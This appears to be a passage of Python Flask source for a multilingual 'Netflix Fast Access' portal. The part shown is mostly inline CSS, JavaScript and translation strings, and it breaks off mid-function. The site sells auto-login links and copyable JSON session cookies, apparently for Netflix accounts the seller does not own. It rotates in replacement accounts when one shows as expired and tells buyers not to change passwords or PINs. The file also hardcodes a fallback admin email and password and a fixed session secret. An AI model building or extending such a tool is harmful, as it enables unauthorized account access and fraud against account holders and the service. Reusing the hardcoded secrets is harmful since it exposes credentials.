import os
import sys
import json
from dotenv import load_dotenv

load_dotenv()

from flask import Flask, request, render_template_string, redirect, url_for, flash, jsonify, session
import urllib.parse
import requests
from requests.exceptions import ProxyError
import threading
from urllib3.exceptions import InsecureRequestWarning
import database
import parser
import checker
import secrets
import re
from functools import wraps
import random
import string

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
sys.stdout.reconfigure(encoding='utf-8')

app = Flask(__name__)
app.secret_key = "super_secret_key_for_flash_messages_and_sessions_123"
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit uploads to 5MB to prevent OOM

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "concumm2@gmail.com")
ADMIN_PASS = os.environ.get("ADMIN_PASSWORD", "Nmtyeunnqt1!")

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

COMMON_STYLE = r"""
<style>
    :root {
        --bg-color: #08090f;
        --card-bg: rgba(22, 26, 42, 0.85);
        --card-border: rgba(255, 255, 255, 0.1);
        --primary: #E50914;
        --primary-hover: #f40612;
        --success: #2ecc71;
        --success-hover: #27ae60;
        --accent-blue: #00a8ff;
        --accent-gold: #f1c40f;
        --accent-purple: #a55eea;
        --danger: #e74c3c;
        --text-main: #ffffff;
        --text-sub: #a0a5b8;
    }
    
    * { box-sizing: border-box; }
    
    body {
        font-family: 'Inter', system-ui, -apple-system, sans-serif;
        background: radial-gradient(circle at 50% 0%, #1a1f36 0%, #08090f 70%);
        color: var(--text-main);
        margin: 0; padding: 0; min-height: 100vh;
        display: flex; flex-direction: column; align-items: center;
        line-height: 1.5;
    }
    
    /* Scrollbar */
    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { background: #08090f; }
    ::-webkit-scrollbar-thumb { background: #2a2f45; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #3d4463; }
    
    .container {
        position: relative; width: 95%; max-width: 980px;
        margin-top: 40px; margin-bottom: 60px; z-index: 1;
    }
    
    .header { text-align: center; margin-bottom: 30px; }
    .header h1 {
        font-size: 2.6rem; font-weight: 900; margin: 0 0 8px 0;
        background: linear-gradient(135deg, #ffffff 0%, #d1d5db 100%);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        letter-spacing: -0.5px;
    }
    .header p { color: var(--text-sub); font-size: 1.05rem; margin: 0; }
    
    .glass-panel {
        background: var(--card-bg);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border: 1px solid var(--card-border);
        border-radius: 20px; padding: 28px; margin-bottom: 25px;
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }
    
    /* Steps Box */
    .steps-container {
        display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
        gap: 12px; margin-bottom: 25px;
    }
    .step-card {
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 14px; padding: 16px; text-align: left;
    }
    .step-num {
        display: inline-block; font-size: 0.75rem; font-weight: 800;
        padding: 3px 8px; border-radius: 6px; background: rgba(229, 9, 20, 0.25);
        color: #ff5252; margin-bottom: 8px; text-transform: uppercase;
    }
    .step-title { font-weight: 700; font-size: 0.95rem; margin-bottom: 4px; color: #fff; }
    .step-desc { font-size: 0.82rem; color: var(--text-sub); line-height: 1.4; }
    
    /* Inputs & Forms */
    .search-box {
        width: 100%; padding: 14px 18px; border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.15); background: rgba(0, 0, 0, 0.4);
        color: #fff; font-family: inherit; font-size: 1.1rem;
        transition: all 0.2s ease; box-sizing: border-box;
    }
    .search-box:focus {
        outline: none; border-color: var(--primary);
        background: rgba(0, 0, 0, 0.6);
        box-shadow: 0 0 15px rgba(229, 9, 20, 0.3);
    }
    
    /* Buttons */
    button, .btn {
        font-family: inherit; font-weight: 700; border: none; border-radius: 12px;
        padding: 14px 24px; cursor: pointer; transition: all 0.2s ease;
        display: inline-flex; align-items: center; justify-content: center; gap: 8px;
        text-decoration: none; font-size: 1rem;
    }
    button:active, .btn:active { transform: scale(0.98); }
    
    .btn-primary { background: var(--primary); color: #fff; }
    .btn-primary:hover { background: var(--primary-hover); box-shadow: 0 6px 20px rgba(229, 9, 20, 0.4); }
    
    .btn-success { background: var(--success); color: #fff; }
    .btn-success:hover { background: var(--success-hover); box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4); }
    
    .btn-danger { background: var(--danger); color: #fff; }
    .btn-danger:hover { background: #c0392b; box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4); }
    
    .btn-blue { background: var(--accent-blue); color: #fff; }
    .btn-blue:hover { background: #0097e6; box-shadow: 0 6px 20px rgba(0, 168, 255, 0.4); }
    
    /* 4 Device Cards Grid */
    .device-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
        gap: 16px;
        margin-top: 15px;
        width: 100%;
    }
    
    .device-card {
        background: rgba(255, 255, 255, 0.04);
        border: 1px solid rgba(255, 255, 255, 0.12);
        border-radius: 18px;
        padding: 22px 16px;
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
        text-decoration: none !important;
        color: #fff !important;
        transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        position: relative;
        overflow: hidden;
        cursor: pointer;
        backdrop-filter: blur(10px);
    }
    
    .device-card:hover {
        transform: translateY(-5px);
        background: rgba(255, 255, 255, 0.08);
    }
    
    .card-pc:hover { border-color: #00a8ff; box-shadow: 0 12px 30px rgba(0, 168, 255, 0.25); }
    .card-mobile:hover { border-color: #2ecc71; box-shadow: 0 12px 30px rgba(46, 204, 113, 0.25); }
    .card-tv:hover { border-color: #a55eea; box-shadow: 0 12px 30px rgba(165, 94, 234, 0.25); }
    .card-general:hover { border-color: #f1c40f; box-shadow: 0 12px 30px rgba(241, 196, 15, 0.25); }
    
    .device-icon-box {
        width: 56px;
        height: 56px;
        border-radius: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 28px;
        margin-bottom: 12px;
        background: rgba(255, 255, 255, 0.06);
        border: 1px solid rgba(255, 255, 255, 0.08);
    }
    
    .device-name {
        font-size: 1.05rem;
        font-weight: 800;
        margin-bottom: 6px;
        color: #fff;
    }
    
    .device-hint {
        font-size: 0.82rem;
        color: var(--text-sub);
        line-height: 1.4;
        margin-bottom: 16px;
        flex-grow: 1;
    }
    
    .device-btn-action {
        width: 100%;
        padding: 11px 14px;
        border-radius: 10px;
        font-size: 0.9rem;
        font-weight: 800;
        border: none;
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        transition: opacity 0.2s;
    }
    .device-btn-action:hover { opacity: 0.92; }
    
    /* Flash messages */
    .flash-message {
        background: rgba(46, 213, 115, 0.15); border: 1px solid rgba(46, 213, 115, 0.4);
        color: #2ed573; padding: 14px; border-radius: 12px; margin-bottom: 20px; text-align: center;
        font-weight: 600; font-size: 0.95rem;
    }
    .flash-error { background: rgba(255, 71, 87, 0.15); border-color: rgba(255, 71, 87, 0.4); color: #ff4757; }
    .flash-warning { background: rgba(255, 159, 67, 0.15); border-color: rgba(255, 159, 67, 0.4); color: #ff9f43; }
    
    /* Table Styling */
    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.95rem; }
    th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--card-border); }
    th { color: var(--text-sub); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
    tr:hover td { background: rgba(255, 255, 255, 0.03); }
    
    /* Modals & Popups */
    .modal {
        display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%;
        background-color: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
        justify-content: center; align-items: center; padding: 20px;
    }
    .modal-content {
        background: #161a2b; padding: 28px; border-radius: 20px; width: 100%; max-width: 440px;
        box-shadow: 0 20px 50px rgba(0,0,0,0.7); border: 1px solid rgba(255, 255, 255, 0.15);
        position: relative; animation: modalFade 0.3s ease;
    }
    @keyframes modalFade { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
    .close-btn { position: absolute; right: 20px; top: 18px; color: #888; font-size: 24px; cursor: pointer; }
    .close-btn:hover { color: #fff; }
</style>
<script>
    function copyCookie(text, btn) {
        let originalText = btn.innerHTML;
        btn.innerHTML = '✔ Copied Cookie';
        btn.style.background = '#20bf6b';
        setTimeout(() => { btn.innerHTML = originalText; btn.style.background = 'rgba(255,255,255,0.08)'; }, 2000);
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(text).catch(err => {
                fallbackCopy(text);
            });
        } else {
            fallbackCopy(text);
        }
    }
    function fallbackCopy(text) {
        let textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try { document.execCommand('copy'); } catch (err) { }
        textArea.remove();
    }
    function showLoading(btn) {
        let originalText = btn.innerHTML;
        btn.innerHTML = '⏳ Connecting...';
        btn.style.pointerEvents = 'none';
        btn.style.opacity = '0.7';
        setTimeout(() => {
            btn.innerHTML = originalText;
            btn.style.pointerEvents = 'auto';
            btn.style.opacity = '1';
        }, 4000);
    }
</script>
"""

PUBLIC_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Access • Fast Auto-Login Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    """ + COMMON_STYLE + r"""
    <script>
        const I18N_DICTS = {
            "en": {
                "portal_title": "🎬 NETFLIX FAST ACCESS",
                "portal_subtitle": "Automated Instant Login Portal • No Password Needed",
                "lang_label": "🌐 Language:",
                "lang_custom_ph": "Type any language (e.g. Spanish, Polish, Russian)...",
                "lang_custom_btn": "✨ AI Translate",
                "steps_header": "⚡ 4 EASY STEPS TO LOGIN",
                "step1_title": "🌐 Connect to US VPN",
                "step1_desc": "Open free <strong>Windscribe VPN</strong> and connect to <strong>USA (Los Angeles)</strong>.",
                "step2_title": "🔑 Enter Access Code",
                "step2_desc": "Paste your 5 to 15 character <strong>Access Code</strong> from your order below.",
                "step3_title": "🚀 Select Device",
                "step3_desc": "Click <strong>LOGIN NOW</strong> and choose your device: PC, Mobile, Smart TV, or General.",
                "step4_title": "🎬 Stream & Enjoy",
                "step4_desc": "Once logged in successfully, you can <strong>disconnect VPN</strong> to stream at full speed!",
                "input_heading": "Enter Access Code",
                "input_placeholder": "e.g. X9K2M1 or 49AD0GJY0YK4I6D",
                "btn_login": "🚀 LOGIN NOW (Generate Links)",
                "btn_report": "⚠️ REPORT ERROR (Instant Auto-Replace)",
                "rules_header": "⚠️ IMPORTANT RULES & USAGE GUIDELINES",
                "rule1": "• <strong>Single Device Policy:</strong> Stream on 1 device at a time. Do not share your code or link.",
                "rule2": "• <strong>Account Protection:</strong> DO NOT change password, email, PIN, or modify profiles.",
                "rule3": "• <strong>US VPN Requirement:</strong> Always connect to US VPN (Windscribe - Los Angeles) before generating and opening links.",
                "rule4": "• <strong>Instant 24/7 Replacement:</strong> If you see an error screen (Expired/On Hold), click <strong>REPORT ERROR</strong> to upload a screenshot for an instant replacement.",
                "rule5": "• <strong>Support Schedule (GMT+7):</strong> 9:00 - 11:00 AM | 3:00 - 5:00 PM | 9:00 - 11:00 PM.",
                "badge_plan": "📦 Plan:",
                "badge_expire": "📅 Expire Date:",
                "card_pc_name": "PC / Laptop",
                "card_pc_hint": "Auto-login to Netflix Profile Selector (\"Who's watching?\") on Computer",
                "card_pc_btn": "💻 Launch on PC",
                "card_mobile_name": "Mobile / Tablet",
                "card_mobile_hint": "Open with Chrome or Brave browser on iPhone or Android",
                "card_mobile_btn": "📱 Open on Mobile",
                "card_tv_name": "Smart TV Code",
                "card_tv_hint": "Enter the 8-digit activation code displayed on your TV screen",
                "card_tv_btn": "📺 Enter TV Code",
                "card_general_name": "Account Info / General",
                "card_general_hint": "Direct access to Account settings, Membership plan & expiration details",
                "card_general_btn": "⚙️ View Account",
                "copy_cookie_btn": "📋 Copy JSON Cookie (For Chrome Extension)",
                "modal_title": "⚠️ Automated Error Report & Replacement",
                "modal_desc": "Upload a screenshot showing the error screen (Expired, Membership on hold, Screen limit). Our system will verify and automatically rotate your account 24/7!",
                "modal_submit": "Submit Report & Get Replacement",
                "chat_btn": "💬 24/7 AI Support Assistant",
                "chat_header": "🤖 AI Support Assistant",
                "chat_welcome": "Hello! How can I help you with your Netflix access today?",
                "chat_pill1": "🌐 How to use VPN?",
                "chat_pill2": "📺 Smart TV Guide",
                "chat_pill3": "⚠️ Report account error"
            },
            "vi": {
                "portal_title": "🎬 NETFLIX FAST ACCESS",
                "portal_subtitle": "Cổng Đăng Nhập Tự Động • Không Cần Mật Khẩu",
                "lang_label": "🌐 Ngôn ngữ:",
                "lang_custom_ph": "Nhập ngôn ngữ bất kỳ (VD: Tiếng Hàn, Tiếng Nga)...",
                "lang_custom_btn": "✨ AI Dịch",
                "steps_header": "⚡ 4 BƯỚC ĐĂNG NHẬP DỄ DÀNG",
                "step1_title": "🌐 Bật VPN Mỹ / US VPN",
                "step1_desc": "Mở ứng dụng <strong>Windscribe VPN</strong> miễn phí, kết nối vị trí <strong>USA (Los Angeles)</strong>.",
                "step2_title": "🔑 Nhập mã Code",
                "step2_desc": "Dán mã <strong>Access Code</strong> (5 đến 15 ký tự) đã nhận từ đơn hàng vào ô bên dưới.",
                "step3_title": "🚀 Chọn Thiết Bị",
                "step3_desc": "Bấm <strong>LOGIN NOW</strong> và chọn: Máy tính (Chọn Profile), Điện thoại, TV hoặc Xem Acc.",
                "step4_title": "🎬 Thưởng Thức",
                "step4_desc": "Đăng nhập thành công, bạn có thể <strong>tắt VPN</strong> đi để xem phim tốc độ cao!",
                "input_heading": "Nhập Mã Truy Cập (Access Code)",
                "input_placeholder": "Ví dụ: X9K2M1 hoặc 49AD0GJY0YK4I6D",
                "btn_login": "🚀 LOGIN NOW (Tạo Link Đăng Nhập)",
                "btn_report": "⚠️ BÁO LỖI (Đổi Acc Tự Động)",
                "rules_header": "⚠️ QUY ĐỊNH SỬ DỤNG & BẢO HÀNH",
                "rule1": "• <strong>Quy định 1 thiết bị:</strong> Xem trên 1 thiết bị tại 1 thời điểm. Không chia sẻ link hoặc code cho người khác.",
                "rule2": "• <strong>Bảo vệ tài khoản:</strong> TUYỆT ĐỐI KHÔNG đổi mật khẩu, email, mã PIN hoặc chỉnh sửa hồ sơ.",
                "rule3": "• <strong>Yêu cầu bật VPN Mỹ:</strong> Luôn bật VPN Mỹ (Windscribe - Los Angeles) trước khi tạo link và bấm đăng nhập.",
                "rule4": "• <strong>Bảo hành tự động 24/7:</strong> Nếu gặp màn hình lỗi (Hết gói, Tạm giữ), bấm <strong>BÁO LỖI</strong> và tải ảnh chụp lên để đổi acc ngay lập tức.",
                "rule5": "• <strong>Khung giờ hỗ trợ (GMT+7):</strong> 9:00 - 11:00 Sáng | 3:00 - 5:00 Chiều | 9:00 - 11:00 Tối.",
                "badge_plan": "📦 Gói Cước:",
                "badge_expire": "📅 Ngày Hết Hạn:",
                "card_pc_name": "Máy Tính / Laptop",
                "card_pc_hint": "Tự động đăng nhập vào màn hình Chọn Profile (\"Ai đang xem?\") trên Máy tính",
                "card_pc_btn": "💻 Vào trên Máy Tính",
                "card_mobile_name": "Điện Thoại / Tablet",
                "card_mobile_hint": "Mở bằng trình duyệt Chrome hoặc Brave trên Điện thoại",
                "card_mobile_btn": "📱 Mở trên Điện Thoại",
                "card_tv_name": "Smart TV",
                "card_tv_hint": "Nhập mã 8 chữ số hiển thị trên màn hình TV của bạn",
                "card_tv_btn": "📺 Nhập Mã TV",
                "card_general_name": "Thông Tin Tài Khoản",
                "card_general_hint": "Chuyển thẳng vào xem thông tin gói cước, hạn dùng và cài đặt acc",
                "card_general_btn": "⚙️ Xem Thông Tin Acc",
                "copy_cookie_btn": "📋 Sao Chép Cookie JSON (Cho Extension Chrome)",
                "modal_title": "⚠️ Báo Lỗi Tự Động & Đổi Tài Khoản",
                "modal_desc": "Tải lên ảnh chụp màn hình hiển thị lỗi (Hết gói, Gia hạn, Hộ gia đình). Hệ thống AI sẽ xác nhận và đổi acc tự động 24/7!",
                "modal_submit": "Gửi Báo Lỗi & Đổi Acc",
                "chat_btn": "💬 Trợ Lý AI Hỗ Trợ 24/7",
                "chat_header": "🤖 Trợ Lý AI Hỗ Trợ",
                "chat_welcome": "Xin chào! Tôi có thể giúp gì cho bạn về tài khoản Netflix hôm nay?",
                "chat_pill1": "🌐 Bật VPN Mỹ như thế nào?",
                "chat_pill2": "📺 Cách đăng nhập Smart TV?",
                "chat_pill3": "⚠️ Hướng dẫn báo lỗi đổi acc"
            },
            "es": {
                "portal_title": "🎬 ACCESO RÁPIDO A NETFLIX",
                "portal_subtitle": "Portal de Inicio de Sesión Automático • Sin Contraseña",
                "lang_label": "🌐 Idioma:",
                "lang_custom_ph": "Escribe cualquier idioma...",
                "lang_custom_btn": "✨ Traducir con IA",
                "steps_header": "⚡ 4 PASOS FÁCILES PARA INICIAR SESIÓN",
                "step1_title": "🌐 Conectar a VPN de EE.UU.",
                "step1_desc": "Abre <strong>Windscribe VPN</strong> gratis y conéctate a <strong>USA (Los Ángeles)</strong>.",
                "step2_title": "🔑 Ingresar Código de Acceso",
                "step2_desc": "Pega tu <strong>Código de Acceso</strong> de 5 a 15 caracteres a continuación.",
                "step3_title": "🚀 Seleccionar Dispositivo",
                "step3_desc": "Haz clic en <strong>LOGIN NOW</strong> y elige tu dispositivo: PC, Móvil, Smart TV o Cuenta.",
                "step4_title": "🎬 Disfruta del Streaming",
                "step4_desc": "Una vez iniciada la sesión, ¡puedes <strong>desconectar la VPN</strong> para ver a máxima velocidad!",
                "input_heading": "Ingresa tu Código de Acceso",
                "input_placeholder": "ej. X9K2M1 o 49AD0GJY0YK4I6D",
                "btn_login": "🚀 INICIAR SESIÓN AHORA",
                "btn_report": "⚠️ REPORTAR ERROR (Reemplazo Instantáneo)",
                "rules_header": "⚠️ REGLAS IMPORTANTES Y POLÍTICA DE GARANTÍA",
                "rule1": "• <strong>Un solo dispositivo:</strong> Mira en 1 dispositivo a la vez. No compartas tu código o enlace.",
                "rule2": "• <strong>Seguridad:</strong> NO cambies contraseña, correo, PIN ni modifiques perfiles.",
                "rule3": "• <strong>Requisito de VPN:</strong> Conéctate siempre a VPN de EE. UU. antes de generar y abrir enlaces.",
                "rule4": "• <strong>Reemplazo automático 24/7:</strong> Si ves un error, haz clic en REPORTAR ERROR para obtener una cuenta nueva.",
                "rule5": "• <strong>Horario de Soporte (GMT+7):</strong> 9-11 AM | 3-5 PM | 9-11 PM.",
                "badge_plan": "📦 Plan:",
                "badge_expire": "📅 Vencimiento:",
                "card_pc_name": "PC / Portátil",
                "card_pc_hint": "Inicio de sesión automático con selector de perfil en el ordenador",
                "card_pc_btn": "💻 Abrir en PC",
                "card_mobile_name": "Móvil / Tablet",
                "card_mobile_hint": "Abrir con Chrome o Brave en tu teléfono o tableta",
                "card_mobile_btn": "📱 Abrir en Móvil",
                "card_tv_name": "Código Smart TV",
                "card_tv_hint": "Introduce el código de 8 dígitos de tu pantalla de TV",
                "card_tv_btn": "📺 Ingresar Código TV",
                "card_general_name": "Información de Cuenta",
                "card_general_hint": "Acceso directo a la suscripción, plan y configuración",
                "card_general_btn": "⚙️ Ver Cuenta",
                "copy_cookie_btn": "📋 Copiar Cookie JSON para Extensión",
                "modal_title": "⚠️ Reporte de Error y Reemplazo Automático",
                "modal_desc": "Sube una captura de pantalla del error. ¡El sistema verificará y cambiará tu cuenta automáticamente!",
                "modal_submit": "Enviar Reporte y Cambiar Cuenta",
                "chat_btn": "💬 Asistente de Soporte IA 24/7",
                "chat_header": "🤖 Asistente IA",
                "chat_welcome": "¡Hola! ¿Cómo puedo ayudarte hoy con tu acceso a Netflix?",
                "chat_pill1": "🌐 ¿Cómo usar la VPN?",
                "chat_pill2": "📺 Guía para Smart TV",
                "chat_pill3": "⚠️ Reportar un error"
            },
            "pt": {
                "portal_title": "🎬 ACESSO RÁPIDO NETFLIX",
                "portal_subtitle": "Portal de Login Automático • Sem Necessidade de Senha",
                "lang_label": "🌐 Idioma:",
                "lang_custom_ph": "Digite qualquer idioma...",
                "lang_custom_btn": "✨ Traduzir com IA",
                "steps_header": "⚡ 4 PASSOS FÁCEIS PARA ENTRAR",
                "step1_title": "🌐 Conectar à VPN dos EUA",
                "step1_desc": "Abra o <strong>Windscribe VPN</strong> gratuito e conecte-se a <strong>USA (Los Angeles)</strong>.",
                "step2_title": "🔑 Digitar Código de Acesso",
                "step2_desc": "Cole o seu <strong>Código de Acesso</strong> de 5 a 15 caracteres no campo abaixo.",
                "step3_title": "🚀 Selecionar Dispositivo",
                "step3_desc": "Clique em <strong>LOGIN NOW</strong> e escolha: PC, Celular, Smart TV ou Conta.",
                "step4_title": "🎬 Assistir e Aproveitar",
                "step4_desc": "Após fazer login, você pode <strong>desconectar a VPN</strong> para assistir em alta velocidade!",
                "input_heading": "Digite seu Código de Acesso",
                "input_placeholder": "ex: X9K2M1 ou 49AD0GJY0YK4I6D",
                "btn_login": "🚀 ENTRAR AGORA (Gerar Links)",
                "btn_report": "⚠️ REPORTAR ERRO (Troca Automática)",
                "rules_header": "⚠️ REGRAS IMPORTANTES E GARANTIA",
                "rule1": "• <strong>Apenas 1 dispositivo:</strong> Assista em 1 tela por vez. Não compartilhe seu código.",
                "rule2": "• <strong>Segurança:</strong> NÃO altere senha, e-mail, PIN ou perfis.",
                "rule3": "• <strong>VPN Obrigatória:</strong> Conecte-se sempre à VPN dos EUA antes de abrir os links.",
                "rule4": "• <strong>Garantia Automática 24/7:</strong> Se houver erro, clique em REPORTAR ERRO para troca imediata.",
                "rule5": "• <strong>Horário de Suporte (GMT+7):</strong> 9-11h | 15-17h | 21-23h.",
                "badge_plan": "📦 Plano:",
                "badge_expire": "📅 Validade:",
                "card_pc_name": "PC / Computador",
                "card_pc_hint": "Login direto com seletor de perfil no navegador do PC",
                "card_pc_btn": "💻 Abrir no PC",
                "card_mobile_name": "Celular / Tablet",
                "card_mobile_hint": "Abra com o navegador Chrome ou Brave no celular",
                "card_mobile_btn": "📱 Abrir no Celular",
                "card_tv_name": "Smart TV",
                "card_tv_hint": "Digite o código de 8 dígitos mostrado na sua TV",
                "card_tv_btn": "📺 Digitar Código TV",
                "card_general_name": "Informações da Conta",
                "card_general_hint": "Acesso direto às configurações e plano da conta",
                "card_general_btn": "⚙️ Ver Conta",
                "copy_cookie_btn": "📋 Copiar Cookie JSON para Extensão",
                "modal_title": "⚠️ Relatório de Erro e Troca Automática",
                "modal_desc": "Envie uma captura de tela do erro. O sistema verificará e atualizará sua conta automaticamente!",
                "modal_submit": "Enviar e Obter Troca",
                "chat_btn": "💬 Assistente de Suporte IA 24/7",
                "chat_header": "🤖 Suporte IA",
                "chat_welcome": "Olá! Como posso ajudar você hoje com seu acesso à Netflix?",
                "chat_pill1": "🌐 Como usar a VPN?",
                "chat_pill2": "📺 Como entrar na Smart TV?",
                "chat_pill3": "⚠️ Como relatar um erro?"
            },
            "pl": {
                "portal_title": "🎬 SZYBKI DOSTĘP DO NETFLIX",
                "portal_subtitle": "Automatyczny Portal Logowania • Bez Hasła",
                "lang_label": "🌐 Język:",
                "lang_custom_ph": "Wpisz dowolny język...",
                "lang_custom_btn": "✨ Przetłumacz z AI",
                "steps_header": "⚡ 4 PROSTE KROKI DO LOGOWANIA",
                "step1_title": "🌐 Połącz z VPN USA",
                "step1_desc": "Włącz darmowy <strong>Windscribe VPN</strong> i połącz się z lokalizacją <strong>USA (Los Angeles)</strong>.",
                "step2_title": "🔑 Wprowadź Kod Dostępu",
                "step2_desc": "Wklej swój 5-15 znakowy <strong>Kod Dostępu</strong> w polu poniżej.",
                "step3_title": "🚀 Wybierz Urządzenie",
                "step3_desc": "Kliknij <strong>LOGIN NOW</strong> i wybierz: Komputer, Telefon, Smart TV lub Konto.",
                "step4_title": "🎬 Oglądaj i Ciesz się",
                "step4_desc": "Po zalogowaniu możesz <strong>wyłączyć VPN</strong>, aby oglądać z maksymalną prędkością!",
                "input_heading": "Wprowadź Kod Dostępu",
                "input_placeholder": "np. X9K2M1 lub 49AD0GJY0YK4I6D",
                "btn_login": "🚀 ZALOGUJ TERAZ (Generuj Linki)",
                "btn_report": "⚠️ ZGŁOŚ BŁĄD (Automatyczna Wymiana)",
                "rules_header": "⚠️ WAŻNE ZASADY I GWARANCJA",
                "rule1": "• <strong>Jedno urządzenie:</strong> Oglądaj na 1 urządzeniu jednocześnie. Nie udostępniaj kodu.",
                "rule2": "• <strong>Bezpieczeństwo:</strong> NIE zmieniaj hasła, e-maila, PIN-u ani profili.",
                "rule3": "• <strong>Wymóg VPN:</strong> Zawsze włączaj VPN USA przed wygenerowaniem i otwarciem linku.",
                "rule4": "• <strong>Automatyczna wymiana 24/7:</strong> W przypadku błędu kliknij ZGŁOŚ BŁĄD i wgraj zrzut ekranu.",
                "rule5": "• <strong>Wsparcie (GMT+7):</strong> 9-11 | 15-17 | 21-23.",
                "badge_plan": "📦 Plan:",
                "badge_expire": "📅 Ważność:",
                "card_pc_name": "PC / Laptop",
                "card_pc_hint": "Logowanie na komputerze z wyborem profilu (\"Kto ogląda?\")",
                "card_pc_btn": "💻 Otwórz na PC",
                "card_mobile_name": "Telefon / Tablet",
                "card_mobile_hint": "Otwórz w przeglądarce Chrome lub Brave na telefonie",
                "card_mobile_btn": "📱 Otwórz na Telefonie",
                "card_tv_name": "Kod Smart TV",
                "card_tv_hint": "Wpisz 8-cyfrowy kod wyświetlany na ekranie TV",
                "card_tv_btn": "📺 Wpisz Kod TV",
                "card_general_name": "Informacje o Koncie",
                "card_general_hint": "Bezpośredni dostęp do ustawień konta i ważności subskrypcji",
                "card_general_btn": "⚙️ Zobacz Konto",
                "copy_cookie_btn": "📋 Kopiuj JSON Cookie do wtyczki Chrome",
                "modal_title": "⚠️ Zgłoszenie Błędu i Wymiana Konta",
                "modal_desc": "Prześlij zrzut ekranu z widocznym błędem. System automatycznie zweryfikuje i wymieni konto!",
                "modal_submit": "Wyślij Zgłoszenie i Wymień",
                "chat_btn": "💬 Asystent Wsparcia AI 24/7",
                "chat_header": "🤖 Asystent AI",
                "chat_welcome": "Cześć! W czym mogę Ci dzisiaj pomóc w dostępie do Netflix?",
                "chat_pill1": "🌐 Jak włączyć VPN?",
                "chat_pill2": "📺 Logowanie na Smart TV",
                "chat_pill3": "⚠️ Jak zgłosić błąd?"
            }
        };

        let currentLang = "en";

        function applyTranslations(dict) {
            document.querySelectorAll("[data-i18n]").forEach(el => {
                const key = el.getAttribute("data-i18n");
                if (dict[key]) {
                    el.innerHTML = dict[key];
                }
            });
            document.querySelectorAll("[data-i18n-placeholder]").forEach(el => {
                const key = el.getAttribute("data-i18n-placeholder");
                if (dict[key]) {
                    el.setAttribute("placeholder", dict[key]);
                }
            });
        }

        function setLanguage(lang) {
            currentLang = lang;
            localStorage.setItem("preferred_lang", lang);
            
            document.querySelectorAll(".lang-pill").forEach(btn => {
                btn.classList.toggle("active-lang", btn.getAttribute("data-lang") === lang);
            });
            
            if (I18N_DICTS[lang]) {
                applyTranslations(I18N_DICTS[lang]);
            }
        }

        function translateWithAI() {
            const input = document.getElementById("customLangInput");
            const targetLang = input.value.trim();
            if (!targetLang) {
                alert("Please enter a language name (e.g. Russian, German, Japanese)!");
                return;
            }

            const btn = document.getElementById("customLangBtn");
            btn.disabled = true;
            btn.innerHTML = "⏳ Translating with AI...";

            fetch("/api/translate_page", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    language: targetLang,
                    texts: I18N_DICTS["en"]
                })
            })
            .then(res => res.json())
            .then(data => {
                btn.disabled = false;
                btn.innerHTML = "✨ AI Translate";
                if (data.success && data.translations) {
                    I18N_DICTS[targetLang] = data.translations;
                    applyTranslations(data.translations);
                    localStorage.setItem("preferred_lang_custom", JSON.stringify({ name: targetLang, dict: data.translations }));
                } else {
                    alert("AI Translation error: " + (data.error || "Could not translate."));
                }
            })
            .catch(err => {
                btn.disabled = false;
                btn.innerHTML = "✨ AI Translate";
                alert("Connection failed during translation!");
            });
        }

        function generateQuickLinks() {
            var rawInput = document.getElementById("rawTokenInput").value.trim();
            if (!rawInput) {
                alert(currentLang === "vi" ? "Vui lòng nhập Access Code!" : "Please enter your Access Code!");
                return;
            }

            var resultDiv = document.getElementById("quickLinksResult");
            var pcLink = document.getElementById("quickPcLink");
            var mobileLink = document.getElementById("quickMobileLink");
            var tvLink = document.getElementById("quickTvLink");
            var generalLink = document.getElementById("quickGeneralLink");
            var statusText = document.getElementById("statusText");
            var btn = document.getElementById("submitBtn");
            var infoBadge = document.getElementById("accountInfoBadge");
            var badgePlan = document.getElementById("badgePlan");
            var badgeExpire = document.getElementById("badgeExpire");
            var cookieBoxWrapper = document.getElementById("cookieBoxWrapper");
            var cookieBtn = document.getElementById("quickCookieBtn");

            infoBadge.style.display = "none";
            btn.disabled = true;
            btn.innerHTML = "⏳ Connecting & Generating Links...";
            statusText.innerText = "";
            
            fetch("/api/generate_nftoken", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cookie: rawInput })
            })
            .then(async (res) => {
                let data;
                try {
                    data = await res.json();
                } catch(e) {
